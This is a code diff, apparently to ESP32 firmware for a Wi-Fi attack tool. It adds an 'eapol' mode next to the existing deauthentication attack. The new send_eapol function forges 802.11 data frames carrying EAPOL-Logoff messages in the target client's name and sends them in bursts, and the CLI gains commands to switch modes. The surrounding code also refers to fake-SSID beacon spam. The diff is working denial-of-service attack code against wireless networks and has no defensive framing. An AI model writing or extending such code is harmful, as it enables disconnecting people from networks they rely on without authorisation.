@@ -15,8 +15,10 @@
 #define MAX_BSSIDS 8
 #define MAX_FAKES 128
 #define FRAME_LEN 26
+#define EAPOL_LEN 36
 
 static volatile bool s_attack = false;
+static volatile bool s_eapol = false;
 static TaskHandle_t s_attack_task = NULL;
 static uint8_t s_target[6];
 static bool s_target_set = false;
@@ -627,6 +629,34 @@ static void send_burst(const uint8_t bssid[6], const uint8_t mac[6])
     }
 }
 
+static void send_eapol(const uint8_t bssid[6], const uint8_t mac[6])
+{
+    uint8_t frame[EAPOL_LEN] = {
+        0x08, 0x01,             // Data, ToDS=1
+        0x00, 0x00,             // Duration
+        // addr1 dest AP, addr2 src STA, addr3 BSSID AP
+        0, 0, 0, 0, 0, 0,
+        0, 0, 0, 0, 0, 0,
+        0, 0, 0, 0, 0, 0,
+        0x00, 0x00,             // SeqCtrl
+        0xAA, 0xAA, 0x03, 0x00, 0x00, 0x00, 0x88, 0x8E, // LLC/SNAP EAPOL
+        0x01, 0x02, 0x00, 0x00  // EAPOL v1, Logoff(2), len 0
+    };
+    uint16_t seq = (esp_random() & 0xFFF) << 4;
+    memcpy(&frame[4], bssid, 6);
+    memcpy(&frame[10], mac, 6);
+    memcpy(&frame[16], bssid, 6);
+    frame[22] = seq & 0xFF;
+    frame[23] = seq >> 8;
+
+    esp_err_t err = esp_wifi_80211_tx(WIFI_IF_STA, frame, sizeof(frame), false);
+    if (err == ESP_OK) {
+        s_sent++;
+    } else if (err == ESP_ERR_NO_MEM || err == ESP_ERR_TIMEOUT) {
+        vTaskDelay(1);
+    }
+}
+
 static esp_err_t set_band_for_channel(int channel)
 {
     wifi_band_mode_t mode = (channel > 14) ? WIFI_BAND_MODE_5G_ONLY : WIFI_BAND_MODE_2G_ONLY;
@@ -635,7 +665,8 @@ static esp_err_t set_band_for_channel(int channel)
 
 static void attack_task(void *arg)
 {
-    printf("ATTACK target %02X:%02X:%02X:%02X:%02X:%02X ch %d bssids %d\n",
+    printf("ATTACK %s target %02X:%02X:%02X:%02X:%02X:%02X ch %d bssids %d\n",
+           s_eapol ? "eapol" : "deauth",
            s_target[0], s_target[1], s_target[2], s_target[3], s_target[4], s_target[5],
            s_channel, s_bssid_count);
 
@@ -665,7 +696,13 @@ static void attack_task(void *arg)
                 ch_reported = true;
             }
             for (int burst = 0; burst < 5; burst++) {
-                send_burst(s_bssids[b], s_target);
+                if (s_eapol) {
+                    for (int i = 0; i < 4; i++) {
+                        send_eapol(s_bssids[b], s_target);
+                    }
+                } else {
+                    send_burst(s_bssids[b], s_target);
+                }
                 vTaskDelay(1);
             }
         }
@@ -695,7 +732,8 @@ static void print_help(void)
     printf("  beaconspam <ssid,..> experimental (may not transmit on C5)\n");
     printf("  beaconspam auto <n>  experimental; generate n fake SSIDs\n");
     printf("  stopbeacons          stop fake SSID beacons\n");
-    printf("  start / stop         start or stop deauth\n");
+    printf("  eapol / deauth       select attack mode (default deauth)\n");
+    printf("  start / stop         start or stop the selected attack\n");
     printf("  status               show config\n");
 }
 
@@ -838,6 +876,12 @@ static void cli_task(void *arg)
             start_beacons(p + 11);
         } else if (!strncmp(p, "stopbeacons", 11)) {
             stop_beacons();
+        } else if (!strncmp(p, "eapol", 5)) {
+            s_eapol = true;
+            printf("mode eapol\n");
+        } else if (!strncmp(p, "deauth", 6)) {
+            s_eapol = false;
+            printf("mode deauth\n");
         } else if (!strncmp(p, "start", 5)) {
             if (!s_target_set || s_bssid_count == 0) {
                 printf("set target and at least one bssid first\n");
@@ -853,9 +897,9 @@ static void cli_task(void *arg)
             s_attack = false;
             printf("stopping\n");
         } else if (!strncmp(p, "status", 6)) {
-            printf("target %02X:%02X:%02X:%02X:%02X:%02X, bssids %d, ch %d, running %d\n",
+            printf("target %02X:%02X:%02X:%02X:%02X:%02X, bssids %d, ch %d, running %d, mode %s\n",
                    s_target[0], s_target[1], s_target[2], s_target[3], s_target[4], s_target[5],
-                   s_bssid_count, s_channel, s_attack);
+                   s_bssid_count, s_channel, s_attack, s_eapol ? "eapol" : "deauth");
             printf("beacons running %d, ssids %d, ch %d\n",
                    s_beacon_run, s_fake_count, s_beacon_ch);
         } else {
